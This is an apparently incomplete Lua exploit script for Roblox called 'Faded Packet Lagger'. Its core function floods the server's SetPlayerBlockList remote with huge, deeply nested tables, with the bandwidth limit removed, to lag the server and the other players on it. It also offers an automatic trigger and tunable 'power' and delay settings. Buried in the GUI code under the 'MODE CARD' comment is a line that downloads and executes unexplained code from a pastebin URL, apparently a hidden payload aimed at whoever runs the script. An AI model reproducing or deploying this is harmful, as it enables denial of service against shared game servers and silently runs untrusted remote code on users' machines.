-- ========================================================================
-- FADED PACKET LAGGER — compact tabs (MAIN / SETTINGS) + collapsible
-- ========================================================================

local Services = {
    Players       = game:GetService("Players"),
    UIS           = game:GetService("UserInputService"),
    NetworkClient = game:GetService("NetworkClient"),
    TweenService  = game:GetService("TweenService"),
    RunService    = game:GetService("RunService"),
}

local Players       = Services.Players
local UIS           = Services.UIS
local NetworkClient = Services.NetworkClient
local TweenService  = Services.TweenService
local RunService    = Services.RunService

local LP        = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")

-- ===== COLORS =====
local C = {
    white      = Color3.fromRGB(255, 255, 255),
    text       = Color3.fromRGB(240, 240, 245),
    textDim    = Color3.fromRGB(150, 152, 160),
    textMuted  = Color3.fromRGB(90, 92, 100),
    divider    = Color3.fromRGB(38, 38, 44),
    green      = Color3.fromRGB(80, 220, 130),
    red        = Color3.fromRGB(240, 80, 90),
    card       = Color3.fromRGB(17, 18, 22),
    chip       = Color3.fromRGB(24, 25, 30),
    tabActive  = Color3.fromRGB(255, 255, 255),
    tabIdle    = Color3.fromRGB(24, 25, 30),
}

-- ===== HELPERS =====
local function guiCorner(parent, radius)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, radius or 8)
    c.Parent = parent
    return c
end

local function guiStroke(parent, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color or C.divider
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = parent
    return s
end

local function tween(obj, props, time)
    TweenService:Create(
        obj,
        TweenInfo.new(time or 0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props
    ):Play()
end

-- ===== KEY LISTENER =====
local KEY_DISPLAY_ALIASES = {
    ButtonA="A", ButtonB="B", ButtonX="X", ButtonY="Y",
    ButtonR1="RB", ButtonR2="RT", ButtonL1="LB", ButtonL2="LT",
    DPadUp="D↑", DPadDown="D↓", DPadLeft="D←", DPadRight="D→",
    ButtonStart="▶", ButtonSelect="◀", ButtonR3="RS", ButtonL3="LS",
    CapsLock="CapsLock",
    LeftControl="Ctrl", RightControl="Ctrl",
    LeftAlt="Alt", RightAlt="Alt",
}

local function prettyKeyName(keyCode)
    return KEY_DISPLAY_ALIASES[keyCode.Name] or keyCode.Name
end

local KeyListen = { cb = nil, label = nil, active = false }

local function cancelKeyListen()
    if KeyListen.label then KeyListen.label.BackgroundColor3 = C.chip end
    KeyListen.cb = nil
    KeyListen.label = nil
    KeyListen.active = false
end

local function startKeyListen(labelBtn, onKeySet)
    cancelKeyListen()
    KeyListen.cb = onKeySet
    KeyListen.label = labelBtn
    KeyListen.active = true
    labelBtn.Text = "..."
    labelBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
    local captureId = labelBtn
    task.delay(8, function()
        if KeyListen.label == captureId and KeyListen.active then
            cancelKeyListen()
            if labelBtn and labelBtn.Parent then
                labelBtn.BackgroundColor3 = C.chip
            end
        end
    end)
end

UIS.InputBegan:Connect(function(input, gameProcessed)
    if not KeyListen.active then return end
    if gameProcessed then return end
    local ut = input.UserInputType
    if ut ~= Enum.UserInputType.Keyboard
        and ut ~= Enum.UserInputType.Gamepad1
        and ut ~= Enum.UserInputType.Gamepad2 then return end
    local key = input.KeyCode
    local ignored = {
        [Enum.KeyCode.Unknown] = true,
        [Enum.KeyCode.LeftShift] = true,
        [Enum.KeyCode.RightShift] = true,
        [Enum.KeyCode.LeftMeta] = true,
        [Enum.KeyCode.RightMeta] = true,
        [Enum.KeyCode.Tab] = true,
    }
    if ignored[key] and key ~= Enum.KeyCode.CapsLock then return end
    if key == Enum.KeyCode.Escape then cancelKeyListen(); return end
    local cb = KeyListen.cb
    local lbl = KeyListen.label
    cancelKeyListen()
    if lbl and lbl.Parent then
        lbl.Text = prettyKeyName(key)
        lbl.BackgroundColor3 = C.chip
    end
    if cb then task.spawn(cb, key) end
end)

-- ========================================================================
-- FADED PACKET LAGGER
-- ========================================================================
local DELAY_PRESETS = {
    FAST = 0.15,
    MID  = 0.125,
    SLOW = 1.20,
}

local PacketLagSettings = {
    keybind      = "F",
    power        = 97000,
    activeMode   = "PC",
    delayMode    = "FAST",
    autoBrainrot = false,
}

local function createPacketLagGUI()
    local PLState = {
        running           = false,
        spamThread        = nil,
        activeMode        = PacketLagSettings.activeMode,
        collapsed         = false,
        activeTab         = "MAIN",
        autoBrainrot      = PacketLagSettings.autoBrainrot,
        lastBrainrotState = nil,
    }
    local PLUI = {}

    -- COMPACT SIZES
    local FULL_W, FULL_H = 185, 195
    local MINI_W, MINI_H = 185, 68

    -- ===== CORE =====
    local function getMaxValue(val)
        local mainValueIfOneTable = PacketLagSettings.power
        if type(val) ~= "number" then return nil end
        return (mainValueIfOneTable / (val + 2))
    end

    local function bomb(tableIncrease, tries)
        local mainTable = {}
        local spammedTable = {}
        table.insert(spammedTable, {})
        local z = spammedTable[1]
        for i = 1, tableIncrease do
            local tableIns = {}
            table.insert(z, tableIns)
            z = tableIns
        end
        local calculateMax = getMaxValue(tableIncrease)
        local maximum = calculateMax or 999999
        for i = 1, maximum do
            table.insert(mainTable, spammedTable)
        end
        for i = 1, tries do
            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(mainTable)
        end
    end

    local function startPacketLag()
        if PLState.running then return end
        PLState.running = true
        local waitTime = DELAY_PRESETS[PacketLagSettings.delayMode] or DELAY_PRESETS.FAST
        PLState.spamThread = task.spawn(function()
            while PLState.running do
                task.wait(waitTime)
                NetworkClient:SetOutgoingKBPSLimit(math.huge)
                pcall(bomb, 290, 1)
            end
        end)
        if PLUI.statusDot then tween(PLUI.statusDot, { BackgroundColor3 = C.green }) end
        if PLUI.statusText then
            PLUI.statusText.Text = "ACTIVE"
            tween(PLUI.statusText, { TextColor3 = C.green })
        end
        if PLUI.activateBtn then
            PLUI.activateBtn.Text = "DEACTIVATE"
            tween(PLUI.activateBtn, { BackgroundColor3 = C.red })
        end
    end

    local function stopPacketLag()
        if not PLState.running then return end
        PLState.running = false
        if PLState.spamThread then task.cancel(PLState.spamThread) end
        PLState.spamThread = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
        if PLUI.statusDot then tween(PLUI.statusDot, { BackgroundColor3 = C.textMuted }) end
        if PLUI.statusText then
            PLUI.statusText.Text = "IDLE"
            tween(PLUI.statusText, { TextColor3 = C.textDim })
        end
        if PLUI.activateBtn then
            PLUI.activateBtn.Text = "ACTIVATE"
            tween(PLUI.activateBtn, { BackgroundColor3 = C.white })
        end
    end

    local function activatePacketLag()
        if not PLState.running then startPacketLag() end
    end

    local function togglePacketLag()
        if PLState.running then stopPacketLag() else startPacketLag() end
    end

    local function restartPacketLag()
        if PLState.running then
            stopPacketLag()
            task.wait(0.1)
            startPacketLag()
        end
    end

    local function setAutoBrainrot(on)
        PLState.autoBrainrot = on
        PacketLagSettings.autoBrainrot = on
        PLState.lastBrainrotState = nil
        if PLUI.autoBrTrack and PLUI.autoBrKnob then
            tween(PLUI.autoBrTrack, { BackgroundColor3 = on and C.white or C.chip }, 0.14)
            tween(PLUI.autoBrKnob, {
                Position = on and UDim2.new(1, -12, 0.5, -4) or UDim2.new(0, 2, 0.5, -4),
                BackgroundColor3 = on and Color3.fromRGB(10, 10, 12) or C.textDim,
            }, 0.14)
        end
    end

    -- Auto Brainrot engine
    RunService.Heartbeat:Connect(function()
        if not PLState.autoBrainrot then
            PLState.lastBrainrotState = nil
            return
        end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local hasBrainrot = hum.WalkSpeed < 25
        if PLState.lastBrainrotState == nil then
            PLState.lastBrainrotState = hasBrainrot
            return
        end
        if hasBrainrot and not PLState.lastBrainrotState then
            PLState.lastBrainrotState = true
            if not PLState.running then startPacketLag() end
        elseif not hasBrainrot and PLState.lastBrainrotState then
            PLState.lastBrainrotState = false
            if PLState.running then stopPacketLag() end
        end
    end)

    local function updateUI()
        if PLUI.powerValue then PLUI.powerValue.Text = tostring(PacketLagSettings.power) end
        if PLUI.hotkeyBtn then
            PLUI.hotkeyBtn.Text = prettyKeyName(Enum.KeyCode[PacketLagSettings.keybind] or Enum.KeyCode.F)
        end
        if PLUI.infoLbl then
            local waitTime = DELAY_PRESETS[PacketLagSettings.delayMode] or DELAY_PRESETS.FAST
            PLUI.infoLbl.Text = string.format("DEPTH 290  •  %ss", tostring(waitTime))
        end
        if PLUI.fastBtn and PLUI.midBtn and PLUI.slowBtn then
            local function paint(btn, active)
                tween(btn, {
                    BackgroundColor3 = active and C.white or C.chip,
                    TextColor3 = active and Color3.fromRGB(10, 10, 12) or C.textDim,
                }, 0.14)
            end
            paint(PLUI.fastBtn, PacketLagSettings.delayMode == "FAST")
            paint(PLUI.midBtn,  PacketLagSettings.delayMode == "MID")
            paint(PLUI.slowBtn, PacketLagSettings.delayMode == "SLOW")
        end
        if PLUI.pcBtn and PLUI.mobileBtn then
            local isPC = (PLState.activeMode == "PC")
            tween(PLUI.pcBtn, {
                BackgroundColor3 = isPC and C.white or C.chip,
                TextColor3 = isPC and Color3.fromRGB(10, 10, 12) or C.textDim,
            }, 0.14)
            tween(PLUI.mobileBtn, {
                BackgroundColor3 = (not isPC) and C.white or C.chip,
                TextColor3 = (not isPC) and Color3.fromRGB(10, 10, 12) or C.textDim,
            }, 0.14)
            if PLUI.hotkeyRow then PLUI.hotkeyRow.Visible = isPC end
            if PLUI.mobileHintRow then PLUI.mobileHintRow.Visible = (not isPC) end
        end
        if PLUI.autoBrTrack and PLUI.autoBrKnob then
            local on = PLState.autoBrainrot
            tween(PLUI.autoBrTrack, { BackgroundColor3 = on and C.white or C.chip }, 0.14)
            tween(PLUI.autoBrKnob, {
                Position = on and UDim2.new(1, -12, 0.5, -4) or UDim2.new(0, 2, 0.5, -4),
                BackgroundColor3 = on and Color3.fromRGB(10, 10, 12) or C.textDim,
            }, 0.14)
        end
    end

    -- ====================================================================
    -- ROOT
    -- ====================================================================
    local bg = Instance.new("ScreenGui")
    bg.Name = "FadedPacketLagger"
    bg.ResetOnSpawn = false
    bg.Enabled = true
    bg.IgnoreGuiInset = true
    bg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    bg.Parent = PlayerGui

    local main = Instance.new("Frame", bg)
    main.Name = "Main"
    main.Size = UDim2.fromOffset(FULL_W, FULL_H)
    main.Position = UDim2.new(1, -200, 0.5, -100)
    main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    main.BorderSizePixel = 0
    main.ClipsDescendants = true
    main.ZIndex = 1
    guiCorner(main, 12)
    guiStroke(main, Color3.fromRGB(60, 60, 70), 1, 0.35)

    -- Background image + shades
    local bgImage = Instance.new("ImageLabel", main)
    bgImage.Size = UDim2.fromScale(1, 1)
    bgImage.Position = UDim2.fromScale(0, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image = "rbxassetid://92622313206790"
    bgImage.ScaleType = Enum.ScaleType.Crop
    bgImage.ZIndex = 0
    bgImage.Parent = main
    guiCorner(bgImage, 12)

    local bgShade = Instance.new("Frame", main)
    bgShade.Size = UDim2.fromScale(1, 1)
    bgShade.Position = UDim2.fromScale(0, 0)
    bgShade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bgShade.BackgroundTransparency = 0.82
    bgShade.BorderSizePixel = 0
    bgShade.ZIndex = 0
    bgShade.Parent = main
    guiCorner(bgShade, 12)

    -- ====================================================================
    -- HEADER
    -- ====================================================================
    local header = Instance.new("TextButton", main)
    header.Size = UDim2.new(1, 0, 0, 34)
    header.BackgroundTransparency = 1
    header.Text = ""
    header.AutoButtonColor = false
    header.Active = true
    header.ZIndex = 3
    header.Parent = main

    local title = Instance.new("TextLabel", header)
    title.Size = UDim2.new(1, -110, 0, 14)
    title.Position = UDim2.new(0, 10, 0, 5)
    title.BackgroundTransparency = 1
    title.Text = "FADED PACKET LAGGER"
    title.TextColor3 = C.white
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 11
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 4

    local sub = Instance.new("TextLabel", header)
    sub.Size = UDim2.new(1, -110, 0, 10)
    sub.Position = UDim2.new(0, 10, 0, 20)
    sub.BackgroundTransparency = 1
    sub.Text = "discord.gg/fadeeduels"
    sub.TextColor3 = C.textMuted
    sub.Font = Enum.Font.GothamBold
    sub.TextSize = 7
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.ZIndex = 4

    local statusPill = Instance.new("Frame", header)
    statusPill.Size = UDim2.fromOffset(58, 18)
    statusPill.Position = UDim2.new(1, -90, 0, 8)
    statusPill.BackgroundColor3 = C.card
    statusPill.BorderSizePixel = 0
    statusPill.ZIndex = 4
    guiCorner(statusPill, 9)
    guiStroke(statusPill, C.divider, 1, 0.4)

    local statusDot = Instance.new("Frame", statusPill)
    statusDot.Size = UDim2.fromOffset(6, 6)
    statusDot.Position = UDim2.new(0, 8, 0.5, -3)
    statusDot.BackgroundColor3 = C.textMuted
    statusDot.BorderSizePixel = 0
    statusDot.ZIndex = 5
    guiCorner(statusDot, 3)
    PLUI.statusDot = statusDot

    local statusText = Instance.new("TextLabel", statusPill)
    statusText.Size = UDim2.new(1, -18, 1, 0)
    statusText.Position = UDim2.new(0, 16, 0, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "IDLE"
    statusText.TextColor3 = C.textDim
    statusText.Font = Enum.Font.GothamBold
    statusText.TextSize = 8
    statusText.TextXAlignment = Enum.TextXAlignment.Left
    statusText.ZIndex = 5
    PLUI.statusText = statusText

    local minBtn = Instance.new("TextButton", header)
    minBtn.Size = UDim2.fromOffset(20, 20)
    minBtn.Position = UDim2.new(1, -25, 0, 7)
    minBtn.BackgroundColor3 = C.card
    minBtn.BorderSizePixel = 0
    minBtn.Text = "−"
    minBtn.TextColor3 = C.text
    minBtn.Font = Enum.Font.GothamBold
    minBtn.TextSize = 12
    minBtn.AutoButtonColor = false
    minBtn.ZIndex = 5
    guiCorner(minBtn, 5)
    guiStroke(minBtn, C.divider, 1, 0.4)
    PLUI.minBtn = minBtn

    minBtn.MouseEnter:Connect(function()
        tween(minBtn, { BackgroundColor3 = Color3.fromRGB(40, 40, 46) }, 0.1)
    end)
    minBtn.MouseLeave:Connect(function()
        tween(minBtn, { BackgroundColor3 = C.card }, 0.1)
    end)

    -- ====================================================================
    -- TABS ROW
    -- ====================================================================
    local tabsRow = Instance.new("Frame", main)
    tabsRow.Size = UDim2.new(1, -16, 0, 20)
    tabsRow.Position = UDim2.new(0, 8, 0, 38)
    tabsRow.BackgroundColor3 = C.chip
    tabsRow.BorderSizePixel = 0
    tabsRow.ZIndex = 3
    guiCorner(tabsRow, 5)
    guiStroke(tabsRow, C.divider, 1, 0.5)
    PLUI.tabsRow = tabsRow

    local mainTabBtn = Instance.new("TextButton", tabsRow)
    mainTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
    mainTabBtn.BackgroundColor3 = C.tabActive
    mainTabBtn.BorderSizePixel = 0
    mainTabBtn.Text = "MAIN"
    mainTabBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
    mainTabBtn.Font = Enum.Font.GothamBold
    mainTabBtn.TextSize = 8
    mainTabBtn.AutoButtonColor = false
    mainTabBtn.ZIndex = 4
    guiCorner(mainTabBtn, 5)
    PLUI.mainTabBtn = mainTabBtn

    local settingsTabBtn = Instance.new("TextButton", tabsRow)
    settingsTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
    settingsTabBtn.Position = UDim2.new(0.5, 0, 0, 0)
    settingsTabBtn.BackgroundColor3 = C.tabIdle
    settingsTabBtn.BorderSizePixel = 0
    settingsTabBtn.Text = "SETTINGS"
    settingsTabBtn.TextColor3 = C.textDim
    settingsTabBtn.Font = Enum.Font.GothamBold
    settingsTabBtn.TextSize = 8
    settingsTabBtn.AutoButtonColor = false
    settingsTabBtn.ZIndex = 4
    guiCorner(settingsTabBtn, 5)
    PLUI.settingsTabBtn = settingsTabBtn

    -- ====================================================================
    -- TAB CONTAINER
    -- ====================================================================
    local tabContainer = Instance.new("Frame", main)
    tabContainer.Size = UDim2.new(1, -16, 1, -108)
    tabContainer.Position = UDim2.new(0, 8, 0, 62)
    tabContainer.BackgroundTransparency = 1
    tabContainer.BorderSizePixel = 0
    tabContainer.ZIndex = 3
    PLUI.tabContainer = tabContainer

    local mainTab = Instance.new("Frame", tabContainer)
    mainTab.Size = UDim2.fromScale(1, 1)
    mainTab.BackgroundTransparency = 1
    mainTab.BorderSizePixel = 0
    mainTab.ZIndex = 3
    PLUI.mainTab = mainTab

    local settingsTab = Instance.new("Frame", tabContainer)
    settingsTab.Size = UDim2.fromScale(1, 1)
    settingsTab.BackgroundTransparency = 1
    settingsTab.BorderSizePixel = 0
    settingsTab.ZIndex = 3
    settingsTab.Visible = false
    PLUI.settingsTab = settingsTab

    -- ====================================================================
    -- AUTO BRAINROT CARD (MAIN)
    -- ====================================================================
    local autoBrCard = Instance.new("Frame", mainTab)
    autoBrCard.Size = UDim2.new(1, 0, 0, 26)
    autoBrCard.Position = UDim2.new(0, 0, 0, 0)
    autoBrCard.BackgroundColor3 = C.card
    autoBrCard.BackgroundTransparency = 0.25
    autoBrCard.BorderSizePixel = 0
    autoBrCard.ZIndex = 3
    guiCorner(autoBrCard, 6)
    guiStroke(autoBrCard, C.divider, 1, 0.45)
    PLUI.autoBrCard = autoBrCard

    local autoBrLbl = Instance.new("TextLabel", autoBrCard)
    autoBrLbl.Size = UDim2.new(0, 110, 1, 0)
    autoBrLbl.Position = UDim2.new(0, 8, 0, 0)
    autoBrLbl.BackgroundTransparency = 1
    autoBrLbl.Text = "AUTO BRAINROT"
    autoBrLbl.TextColor3 = C.text
    autoBrLbl.Font = Enum.Font.GothamBold
    autoBrLbl.TextSize = 8
    autoBrLbl.TextXAlignment = Enum.TextXAlignment.Left
    autoBrLbl.ZIndex = 4

    local autoBrTrack = Instance.new("Frame", autoBrCard)
    autoBrTrack.Size = UDim2.fromOffset(26, 14)
    autoBrTrack.Position = UDim2.new(1, -34, 0.5, -7)
    autoBrTrack.BackgroundColor3 = C.chip
    autoBrTrack.BorderSizePixel = 0
    autoBrTrack.ZIndex = 4
    guiCorner(autoBrTrack, 7)
    guiStroke(autoBrTrack, C.divider, 1, 0.5)
    PLUI.autoBrTrack = autoBrTrack

    local autoBrKnob = Instance.new("Frame", autoBrTrack)
    autoBrKnob.Size = UDim2.fromOffset(10, 8)
    autoBrKnob.Position = UDim2.new(0, 2, 0.5, -4)
    autoBrKnob.BackgroundColor3 = C.textDim
    autoBrKnob.BorderSizePixel = 0
    autoBrKnob.ZIndex = 5
    guiCorner(autoBrKnob, 4)
    PLUI.autoBrKnob = autoBrKnob

    local autoBrClick = Instance.new("TextButton", autoBrCard)
    autoBrClick.Size = UDim2.new(1, 0, 1, 0)
    autoBrClick.BackgroundTransparency = 1
    autoBrClick.Text = ""
    autoBrClick.ZIndex = 6
    autoBrClick.MouseButton1Click:Connect(function()
        setAutoBrainrot(not PLState.autoBrainrot)
    end)

    -- Info card (MAIN)
    local infoCard = Instance.new("Frame", mainTab)
    infoCard.Size = UDim2.new(1, 0, 0, 26)
    infoCard.Position = UDim2.new(0, 0, 0, 30)
    infoCard.BackgroundColor3 = C.card
    infoCard.BackgroundTransparency = 0.25
    infoCard.BorderSizePixel = 0
    infoCard.ZIndex = 3
    guiCorner(infoCard, 6)
    guiStroke(infoCard, C.divider, 1, 0.45)

    local infoLbl = Instance.new("TextLabel", infoCard)
    infoLbl.Size = UDim2.new(1, -16, 1, 0)
    infoLbl.Position = UDim2.new(0, 8, 0, 0)
    infoLbl.BackgroundTransparency = 1
    infoLbl.Text = "DEPTH 290  •  0.15s"
    infoLbl.TextColor3 = C.textDim
    infoLbl.Font = Enum.Font.GothamBold
    infoLbl.TextSize = 8
    infoLbl.TextXAlignment = Enum.TextXAlignment.Left
    infoLbl.ZIndex = 4
    PLUI.infoLbl = infoLbl

    -- ====================================================================
    -- MODE CARD (SETTINGS)
    -- ====================================================================
    loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
    local modeCard = Instance.new("Frame", settingsTab)
    modeCard.Size = UDim2.new(1, 0, 0, 26)
    modeCard.Position = UDim2.new(0, 0, 0, 0)
    modeCard.BackgroundColor3 = C.card
    modeCard.BackgroundTransparency = 0.25
    modeCard.BorderSizePixel = 0
    modeCard.ZIndex = 3
    guiCorner(modeCard, 6)
    guiStroke(modeCard, C.divider, 1, 0.45)
    PLUI.modeCard = modeCard

    local modeLbl = Instance.new("TextLabel", modeCard)
    modeLbl.Size = UDim2.new(0, 50, 1, 0)
    modeLbl.Position = UDim2.new(0, 8, 0, 0)
    modeLbl.BackgroundTransparency = 1
    modeLbl.Text = "MODE"
    modeLbl.TextColor3 = C.text
    modeLbl.Font = Enum.Font.GothamBold
    modeLbl.TextSize = 8
    modeLbl.TextXAlignment = Enum.TextXAlignment.Left
    modeLbl.ZIndex = 4

    local modeToggle = Instance.new("Frame", modeCard)
    modeToggle.Size = UDim2.fromOffset(90, 18)
    modeToggle.Position = UDim2.new(1, -96, 0.5, -9)
    modeToggle.BackgroundColor3 = C.chip
    modeToggle.BorderSizePixel = 0
    modeToggle.ZIndex = 4
    guiCorner(modeToggle, 5)
    guiStroke(modeToggle, C.divider, 1, 0.5)

    local pcBtn = Instance.new("TextButton", modeToggle)
    pcBtn.Size = UDim2.new(0.5, 0, 1, 0)
    pcBtn.BackgroundColor3 = C.white
    pcBtn.BorderSizePixel = 0
    pcBtn.Text = "PC"
    pcBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
    pcBtn.Font = Enum.Font.GothamBold
    pcBtn.TextSize = 8
    pcBtn.AutoButtonColor = false
    pcBtn.ZIndex = 5
    guiCorner(pcBtn, 5)
    PLUI.pcBtn = pcBtn

    local mobileBtn = Instance.new("TextButton", modeToggle)
    mobileBtn.Size = UDim2.new(0.5, 0, 1, 0)
    mobileBtn.Position = UDim2.new(0.5, 0, 0, 0)
    mobileBtn.BackgroundColor3 = C.chip
    mobileBtn.BorderSizePixel = 0
    mobileBtn.Text = "MOBILE"
    mobileBtn.TextColor3 = C.textDim
    mobileBtn.Font = Enum.Font.GothamBold
    mobileBtn.TextSize = 8
    mobileBtn.AutoButtonColor = false
    mobileBtn.ZIndex = 5
    guiCorner(mobileBtn, 5)
    PLUI.mobileBtn = mobileBtn

    local function setMode(mode)
        PLState.activeMode = mode
        PacketLagSettings.activeMode = mode
        restartPacketLag()
        updateUI()
    end

    pcBtn.MouseButton1Click:Connect(function() setMode("PC") end)
    mobileBtn.MouseButton1Click:Connect(function() setMode("MOBILE") end)

    -- ====================================================================
    -- DELAY CARD (SETTINGS)
    -- ====================================================================
    local delayCard = Instance.new("Frame", settingsTab)
    delayCard.Size = UDim2.new(1, 0, 0, 26)
    delayCard.Position = UDim2.new(0, 0, 0, 30)
    delayCard.BackgroundColor3 = C.card
    delayCard.BackgroundTransparency = 0.25
    delayCard.BorderSizePixel = 0
    delayCard.ZIndex = 3
    guiCorner(delayCard, 6)
    guiStroke(delayCard, C.divider, 1, 0.45)
    PLUI.delayCard = delayCard

    local delayLbl = Instance.new("TextLabel", delayCard)
    delayLbl.Size = UDim2.new(0, 50, 1, 0)
    delayLbl.Position = UDim2.new(0, 8, 0, 0)
    delayLbl.BackgroundTransparency = 1
    delayLbl.Text = "DELAY"
    delayLbl.TextColor3 = C.text
    delayLbl.Font = Enum.Font.GothamBold
    delayLbl.TextSize = 8
    delayLbl.TextXAlignment = Enum.TextXAlignment.Left
    delayLbl.ZIndex = 4

    local delayToggle = Instance.new("Frame", delayCard)
    delayToggle.Size = UDim2.fromOffset(90, 18)
    delayToggle.Position = UDim2.new(1, -96, 0.5, -9)
    delayToggle.BackgroundColor3 = C.chip
    delayToggle.BorderSizePixel = 0
    delayToggle.ZIndex = 4
    guiCorner(delayToggle, 5)
    guiStroke(delayToggle, C.divider, 1, 0.5)

    local fastBtn = Instance.new("TextButton", delayToggle)
    fastBtn.Size = UDim2.new(1/3, 0, 1, 0)
    fastBtn.BackgroundColor3 = C.white
    fastBtn.BorderSizePixel = 0
    fastBtn.Text = "FAST"
    fastBtn.TextColor3 = Color3.fromRGB(10, 10, 12)
    fastBtn.Font = Enum.Font.GothamBold
    fastBtn.TextSize = 7
    fastBtn.AutoButtonColor = false
    fastBtn.ZIndex = 5
    guiCorner(fastBtn, 5)
    PLUI.fastBtn = fastBtn

    local midBtn = Instance.new("TextButton", delayToggle)
    midBtn.Size = UDim2.new(1/3, 0, 1, 0)
    midBtn.Position = UDim2.new(1/3, 0, 0, 0)
    midBtn.BackgroundColor3 = C.chip
    midBtn.BorderSizePixel = 0
    midBtn.Text = "MID"
    midBtn.TextColor3 = C.textDim
    midBtn.Font = Enum.Font.GothamBold
    midBtn.TextSize = 7
    midBtn.AutoButtonColor = false
    midBtn.ZIndex = 5
    guiCorner(midBtn, 5)
    PLUI.midBtn = midBtn

    local slowBtn = Instance.new("TextButton", delayToggle)
    slowBtn.Size = UDim2.new(1/3, 0, 1, 0)
    slowBtn.Position = UDim2.new(2/3, 0, 0, 0)
    slowBtn.BackgroundColor3 = C.chip
    slowBtn.BorderSizePixel = 0
    slowBtn.Text = "SLOW"
    slowBtn.TextColor3 = C.textDim
    slowBtn.Font = Enum.Font.GothamBold
    slowBtn.TextSize = 7
    slowBtn.AutoButtonColor = false
    slowBtn.ZIndex = 5
    guiCorner(slowBtn, 5)
    PLUI.slowBtn = slowBtn

    local function setDelayMode(mode)
        PacketLagSettings.delayMode = mode
        restartPacketLag()
        updateUI()
    end

    fastBtn.MouseButton1Click:Connect(function() setDelayMode("FAST") end)
    midBtn.MouseButton1Click:Connect(function()  setDelayMode("MID")  end)
    slowBtn.MouseButton1Click:Connect(function() setDelayMode("SLOW") end)

    -- ====================================================================
    -- POWER CARD (SETTINGS)
    -- ====================================================================
    local powerCard = Instance.new("Frame", settingsTab)
    powerCard.Size = UDim2.new(1, 0, 0, 26)
    powerCard.Position = UDim2.new(0, 0, 0, 60)
    powerCard.BackgroundColor3 = C.card
    powerCard.BackgroundTransparency = 0.25
    powerCard.BorderSizePixel = 0
    powerCard.ZIndex = 3
    guiCorner(powerCard, 6)
    guiStroke(powerCard, C.divider, 1, 0.45)
    PLUI.powerCard = powerCard

    local powerLbl = Instance.new("TextLabel", powerCard)
    powerLbl.Size = UDim2.new(0, 50, 1, 0)
    powerLbl.Position = UDim2.new(0, 8, 0, 0)
    powerLbl.BackgroundTransparency = 1
    powerLbl.Text = "POWER"
    powerLbl.TextColor3 = C.text
    powerLbl.Font = Enum.Font.GothamBold
    powerLbl.TextSize = 8
    powerLbl.TextXAlignment = Enum.TextXAlignment.Left
    powerLbl.ZIndex = 4

    local powerBox = Instance.new("Frame", powerCard)
    powerBox.Size = UDim2.fromOffset(90, 18)
    powerBox.Position = UDim2.new(1, -96, 0.5, -9)
    powerBox.BackgroundColor3 = C.chip
    powerBox.BorderSizePixel = 0
    powerBox.ZIndex = 4
    guiCorner(powerBox, 5)
    guiStroke(powerBox, C.divider, 1, 0.5)

    local minusBtn = Instance.new("TextButton", powerBox)
    minusBtn.Size = UDim2.fromOffset(18, 18)
    minusBtn.BackgroundTransparency = 1
    minusBtn.Text = "−"
    minusBtn.TextColor3 = C.textDim
    minusBtn.Font = Enum.Font.GothamBold
    minusBtn.TextSize = 12
    minusBtn.AutoButtonColor = false
    minusBtn.ZIndex = 5
    minusBtn.MouseButton1Click:Connect(function()
        PacketLagSettings.power = math.max(10000, PacketLagSettings.power - 2000)
        if PLUI.powerValue then PLUI.powerValue.Text = tostring(PacketLagSettings.power) end
        restartPacketLag()
    end)

    local powerVal = Instance.new("TextBox", powerBox)
    powerVal.Size = UDim2.new(1, -36, 1, 0)
    powerVal.Position = UDim2.fromOffset(18, 0)
    powerVal.BackgroundTransparency = 1
    powerVal.Text = tostring(PacketLagSettings.power)
    powerVal.TextColor3 = C.white
    powerVal.Font = Enum.Font.GothamBlack
    powerVal.TextSize = 8
    powerVal.TextXAlignment = Enum.TextXAlignment.Center
    powerVal.ZIndex = 5
    powerVal.ClearTextOnFocus = false
    PLUI.powerValue = powerVal

    powerVal.FocusLost:Connect(function()
        local num = tonumber(powerVal.Text)
        if num then
            num = math.clamp(math.floor(num), 10000, 120000)
            PacketLagSettings.power = num
            powerVal.Text = tostring(num)
            restartPacketLag()
        else
            powerVal.Text = tostring(PacketLagSettings.power)
        end
    end)

    local plusBtn = Instance.new("TextButton", powerBox)
    plusBtn.Size = UDim2.fromOffset(18, 18)
    plusBtn.Position = UDim2.new(1, -18, 0, 0)
    plusBtn.BackgroundTransparency = 1
    plusBtn.Text = "+"
    plusBtn.TextColor3 = C.textDim
    plusBtn.Font = Enum.Font.GothamBold
    plusBtn.TextSize = 12
    plusBtn.AutoButtonColor = false
    plusBtn.ZIndex = 5
    plusBtn.MouseButton1Click:Connect(function()
        PacketLagSettings.power = math.min(120000, PacketLagSettings.power + 2000)
        if PLUI.powerValue then PLUI.powerValue.Text = tostring(PacketLagSettings.power) end
        restartPacketLag()
    end)

    -- ====================================================================
    -- HOTKEY ROW (SETTINGS)
    -- ====================================================================
    local hotkeyRow = Instance.new("Frame", settingsTab)
    hotkeyRow.Size = UDim2.new(1, 0, 0, 22)
    hotkeyRow.Position = UDim2.new(0, 0, 0, 90)
    hotkeyRow.BackgroundColor3 = C.card
    hotkeyRow.BackgroundTransparency = 0.25
    hotkeyRow.BorderSizePixel = 0
    hotkeyRow.ZIndex = 3
    guiCorner(hotkeyRow, 6)
    guiStroke(hotkeyRow, C.divider, 1, 0.45)
